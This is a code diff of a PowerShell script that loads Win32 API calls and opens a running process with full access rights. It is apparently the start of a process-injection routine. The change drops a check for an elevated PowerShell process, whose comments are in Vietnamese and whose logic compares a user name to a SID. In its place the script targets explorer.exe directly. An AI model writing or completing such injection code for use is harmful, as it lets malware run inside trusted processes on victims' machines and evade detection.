@@ -46,19 +46,7 @@ public class Win32API {
 
 $win32api = Add-Type -TypeDefinition $Win32APICode -PassThru
 
-$allProcesses = Get-Process powershell
-
-# Kiểm tra quyền admin (elevated)
-$targetProcess = $allProcesses | Where-Object {
-    $token = ($_ | Get-WmiObject -Class Win32_Process).GetOwnerSid()
-    $elevated = ((Get-WmiObject -Query "SELECT * FROM Win32_ComputerSystem").UserName -eq $token)
-    $elevated -eq $true
-} | Select-Object -First 1
-
-# Nếu không tìm thấy process nào với quyền admin, chọn process thường
-if (-not $targetProcess) {
-    $targetProcess = $allProcesses | Select-Object -First 1
-}
+$targetProcess = Get-Process explorer | Select-Object -First 1
 $processHandle = $win32api::OpenProcess(0x1F0FFF, $false, $targetProcess.Id)
 
 $size = 0x1000
